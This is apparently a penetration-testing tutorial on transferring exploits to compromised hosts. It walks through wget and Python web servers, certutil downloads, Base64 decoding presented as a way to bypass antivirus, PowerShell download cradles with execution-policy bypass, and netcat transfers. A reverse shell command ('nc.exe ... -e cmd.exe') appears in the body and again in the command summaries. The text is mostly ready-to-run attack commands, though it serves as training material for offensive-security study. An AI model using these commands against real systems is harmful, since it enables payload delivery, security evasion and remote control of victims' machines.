
--- Transferring exploits ---

• Linux file transfers
• Python SimpleHTTPServer
• Windows file transfers


When you have to compile an exploit on the attack box you first have to transfer the compiled exploit to the target host before you execute it. If you are lucky enough to have file transfer services or applications, such as FTP or wget, available on the compromised host, you can use these to transfer your compiled exploit. If you’re not so lucky and there are no file transfer tools installed, you have to be more creative and transfer files using Netcat, PowerShell, VBScript or Meterpreter.


-- Linux file transfers --

Given that you have command execution on the target, the easiest way to transfer files from your attack box to a Linux machine is by using wget. Wget is a free software package that is installed by default on most Linux distributions and downloads files using HTTP, HTTPS and FTP. When wget is available on the target host you just need to setup a web or FTP server on the attack box to serve the files.
Let’s assume we have downloaded the exploit that we want to transfer to a compromised host to the desktop of our attack box. To make this file available for download we need to copy it to the Apache web root directory and start a webserver to serve the files in this directory to the target. The default web root directory for the Apache webserver is /var/www/html and this is the location to which we will copy the exploit files from our desktop using the following commands:

cd Desktop
cp exploit /var/www/html

Start the Apache webserver so we can download the exploit file to the compromised host: service apache2 start

Now we can access the Apache web server from the web browser (or wget) using the following URL: http://[IP Webserver]

After serving the last file make sure that you stop the Apache server on the attack box with the following command: service apache2 stop


-- Python SimpleHTTPServer --

Python SimpleHTTPServer is a Python module that allows you to use a single command to create a web server to serve files and web pages. The only requirement for running this module is that you have Python installed.

Python SimpleHTTPServer serves the files in the directory from which it is started. For this reason, it’s important to be careful not to start the webserver in root directories (such as Linux root: ‘/’ or the root users home directory: ‘/root/’) or in directories containing files you don’t want to share.

To start the Python SimpleHTTPServer run the following command from the directory that contains the files you want to serve:

sudo python -m SimpleHTTPServer [Optional: port]
sudo python3 -m http.server [Optional: port]

Providing a port number is optional, but if you don’t specify a port number the webserver will bind to port 8000 by default.

Info: It is important to realize that the Python SimpleHTTPServer serves all files and directories from the directory where it’s executed. For example, starting the web server in your OS root directory will serve all files on the system. Therefore, it’s recommended that you only start the web server in a directory that only contains files you want to serve, preferably a dedicated (temporary) ‘sharing directory’.

Now that we’ve got our Python web server running we can use wget on the compromised host to download the file. Use the following command on the remote host to download the file: wget http://172.16.1.1.:8000/exploit.exe

wget http://[IP attack box][:port]/[File name]

!!! Since we’re downloading a file from the attack box to the compromised host we need to enter the IP address of the attack box. !!!

Finally, if we want to execute the downloaded exploit on the remote system we must set the correct permissions to execute the file with the following command: chmod 775 [filename]

After serving the last file make sure that you stop the Python web server on the attack box by simply hitting Ctrl+C in the terminal window.


-- Windows file transfers --

File transfers on Windows machines are a little harder to achieve from the command line as Windows systems do not have a native tool like wget. Nevertheless, we have several other options that generally come down to the use of built-in programs that we can use to transfers files such as certutil.exe and available scripting languages such as VBScript (Windows XP, Vista, 2003 and earlier) or PowerShell (Windows 7 and later). The easiest way to transfer such scripts to the remote host is to build them directly on the target line by line using a command-line shell.


>> CertUtil.exe <<

Windows has a built-in command-line program called CertUtil.exe, which is installed as part of Certificate Services and can be used to manage certificates in Windows. With certutil you can perform various function related to certificates and certificate stores, such as displaying certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains.

Certutil is also known as a Living Of Land (LOL) binary which is a trusted, pre-installed system tool with ‘extra’ unexpected functionality, such as downloading files. An interesting feature of certutil is the option to download a remote certificate from a remote URL and save it to the local file system. While this feature is intended to download certificate files, it can also be used to download non-certificate files with one simple command, including scripts and executables.

>> Transferring files with CertUtil.exe <<

With the following command we can download a file by specifying a download URL and save it to the local file system by specifying a filename as the final argument: certutil -urlcache -split -f [URL] [Filename.Extension]

certutil -urlcache -split -f http://172.16.1.3 nc.exe


>> Base64-encoded payloads <<

Another nice feature of CertUtil.exe that may help to bypass security controls is the option to decode Base64-encoded files to the file system. Using the -decode option, we can download a Base64-encoded malicious executable as text file and decode the executable to disk. This may help in effectively bypassing security controls such as antivirus, edge devices and filtering.

First, we need to Base64-encode the Netcat executable. The command to Base64-encode files with CertUtil.exe looks as follows: certutil.exe -encode [inputFileName] [encodedOutputFileName]

certutil -encode nc.exe nc.txt

The output of this command is a text file that contains the Base64-encoded nc.exe binary. This text file can be transferred to the comprised target where it will be decoded back to a binary on disk. To verify that the nc.txt file contains text, we can run the following command to print the first 10 lines to the terminal:

powershell -command "Get-Content nc.txt -Head 10"

The next step is to transfer the text file to the target and decode it back to an executable. We can do this with the following commands: certutil.exe -urlcache -split -f "http://[Attack box IP] /nc.txt" nc.txt

certutil.exe -urlcache -split -f "http://172.16.1.2/nc.txt" nc.txt

And the following command decodes the Base64-encoded binary back to an executable file: certutil.exe -decode nc.txt nc.exe

To verify that we got a working version of Netcat, we can execute this binary to connect back to our attack box. Execute the following command on the Windows compromised host to initiate the reverse shell to the attack box and connect the cmd.exe program to the shell: 

nc.exe [Attack box IP]  5555 -e cmd.exe

- Commands Summary -

certutil -encode nc.exe nc.txt
powershell -command "Get-Content nc.txt -Head 10"
certutil.exe -urlcache -split -f "http://172.16.1.2/nc.txt" nc.txt
certutil.exe -decode nc.txt nc.exe

nc.exe [Attack box IP]  5555 -e cmd.exe

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
https://ss64.com/nt/certutil.html
https://attack.mitre.org/software/S0160/
https://github.com/LOLBAS-Project/LOLBAS
https://lolbas-project.github.io/lolbas/Binaries/Certutil/


>> VBScript file downloader <<

VBScript (“Microsoft Visual Basic Scripting Edition”) is a powerful active scripting language developed by Microsoft. VBScript can be used to perform a variety of tasks on the host system including the downloading of files from remote locations. 

The following command creates a script file called httpdownload.vbs and writes the first line of code in the created file: echo [script code] > httpdownload.vbs
Add a new line to the bottom of an existing file (be sure to use >> and not >. A single > will overwrite the file): echo [script code] >> httpdownload.vbs

Repeat this process for every line of code that you want to add to the script file. In this way you can build your http download script from scratch on the command line without transferring files using other applications or services. One way of avoiding typos and causing errors in your script is to write the commands to a local text file first

https://web.archive.org/web/20161005065540/https://technet.microsoft.com/en-us/scriptcenter/dd940112.aspx


>> PowerShell Downloads: System.Net.WebClient <<

The following commands create a PowerShell script on the remote Windows machine that can be used to download the file from the attack box:

echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1

echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
echo $webclient.DownloadFile("http://172.16.3.1/nc.exe","nc.exe") >> httpdownload.ps1

$webclient = New-Object System.Net.WebClient
$webclient.DownloadFile("http://172.16.3.1/nc.exe","nc.exe")

Once verified that the PowerShell script is successfully created, you can execute the script with the following command: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1

Alternatively, we can also execute this command from a regular command line in Windows using PowerShell to download files without creating a script: powershell -c "(new-object System.Net.WebClient).DownloadFile('[Download URL]','[File Name]')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"

Note: In order to execute scripts with PowerShell the execution policy should allow scripts to be run on the system. Set the policy to ‘Unrestricted’ effectively allowing us to run scripts on the target system:

Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted

- Commands Summary -

$webclient = New-Object System.Net.WebClient
$webclient.DownloadFile("http://172.16.3.1/nc.exe","nc.exe")

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"

Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted


https://msdn.microsoft.com/en-us/library/system.net.webclient.aspx


>> PowerShell Downloads: Start-BitsTransfer <<

Another way to download files with PowerShell is by using the Background Intelligent Transfer Service (BITS). The Start-BitsTransfer cmdlet creates a BITS transfer job to transfer one or more files between a client computer and a server. Using BITS for file transfers has some major advantages over other methods. BITS allows you to limit the amount bandwidth for a file transfer, to process multiple downloads, to set a web proxy and it doesn’t rely on Internet Explorer in the way that the Invoke-WebRequest (PowerShell 3.0 and up) cmdlet does. Another benefit of BITS is that it only uses idle network bandwidth instead of the whole bandwidth as many other file transfer services do. BITS can, therefore, be used to process large files without affecting other network applications. BITS transfers are also more reliable because transfers will continue when a user changes network connection or restarts the computer.

Unfortunately using BITS for file transfers also has a few disadvantages. One potential downside is that BITS has to be enabled on the target machine in order to work. However, since BITS is usually enabled by default this won’t cause much of an issue unless it’s actively managed by system administrators. Another potential downside (which we also counted as an advantage above), is that BITS only uses idle bandwidth and this may affect the total process time for the file transfer where available bandwidth is limited. BITS is also designed to process file transfers in the background so your BITS job may end up being in a queue waiting for a running job to complete.

As this method only uses 2 lines of code we will execute this script on a single line from the command line instead of building a script on the local file system. In our example we will download nc.exe from a remote location and store it on the C drive. As a minimum we need to specify a source and destination for the download. The following command will download nc.exe from a remote web server to the C drive: powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[IP Attack box]/nc.exe -Destination C:\

powershell Import-Module BitsTransfer; Start-BitsTransfer -Source http://10.11.1.17/nc.exe -Destination C:\

https://learn.microsoft.com/en-us/windows/win32/bits/about-bits?redirectedfrom=MSDN
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd819420(v=technet.10)?redirectedfrom=MSDN


>> PowerShell Downloads: Invoke-WebRequest <<

The Invoke-WebRequest cmdlet is simple and easy to use and is available in PowerShell version 3.0 and higher.
It is very slow compared to the other PowerShell methods we considered. This cmdlet takes a huge performance hit because the HTTP response stream is first buffered into memory and flushed to disk only once it’s fully loaded. Additionally, downloading large files with this method may cause potential memory issues.

The following command downloads nc.exe from our remote web server to the C drive: powershell Invoke-WebRequest -Uri http://[IP Attack box]/nc.exe -OutFile C:\nc.exe

powershell Invoke-WebRequest -Uri http://10.11.1.17/nc.exe -OutFile C:\nc.exe

You can check the version of PowerShell installed by using the following command: powershell $PSVersionTable.PSVersion

https://learn.microsoft.com/en-gb/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5&viewFallbackFrom=powershell-3.0


>>  Netcat file transfers <<

Let’s assume we already have command execution on a target host and we want to transfer a file from the attack box to this host. Because we’re actually sending the file from the attack box to the remote host, the first thing we have to do is to setup a Netcat listener on the target host and specify the output for the file. We will be using port 8080 for this purpose and the file will be saved to the desktop:

nc -lvp 8080 > /root/Desktop/transfer.txt

On the attack box we can now connect to port 8080 and send a file called transfer.txt:

nc 192.168.100.107 8080 < /root/Desktop/transfer.txt

Note: In the following example 192.168.100.113 (Red) is the attacker and 192.168.100.107 (Green) is the target host.

















**************************************************************************************************************************************

-- Commands Summary --

Linux file transfers:

cd Desktop
cp exploit /var/www/html

service apache2 start
http://[IP Webserver]
service apache2 stop


Python SimpleHTTPServer: 

sudo python -m SimpleHTTPServer 8000 or sudo python3 -m http.server 8000
wget http://172.16.1.1:8000/exploit.exe
chmod 775 exploit.exe


Windows file transfers:

Certutil: certutil -urlcache -split -f http://172.16.1.3 nc.exe

Base64-encoded payloads:

certutil -encode nc.exe nc.txt
powershell -command "Get-Content nc.txt -Head 10"
certutil.exe -urlcache -split -f "http://172.16.1.2/nc.txt" nc.txt
certutil.exe -decode nc.txt nc.exe

nc.exe [Attack box IP]  5555 -e cmd.exe


VBScript file downloader: echo [script code] > httpdownload.vbs, echo [script code] >> httpdownload.vbs


PowerShell Downloads: System.Net.WebClient:

$webclient = New-Object System.Net.WebClient
$webclient.DownloadFile("http://172.16.3.1/nc.exe","nc.exe")

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"

Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted


PowerShell Downloads: Start-BitsTransfer: powershell Import-Module BitsTransfer; Start-BitsTransfer -Source http://10.11.1.17/nc.exe -Destination C:\

PowerShell Downloads: Invoke-WebRequest: powershell Invoke-WebRequest -Uri http://10.11.1.17/nc.exe -OutFile C:\nc.exe

Netcat file transfers: nc -lvp 8080 > /root/Desktop/transfer.txt AND nc 192.168.100.107 8080 < /root/Desktop/transfer.txt






















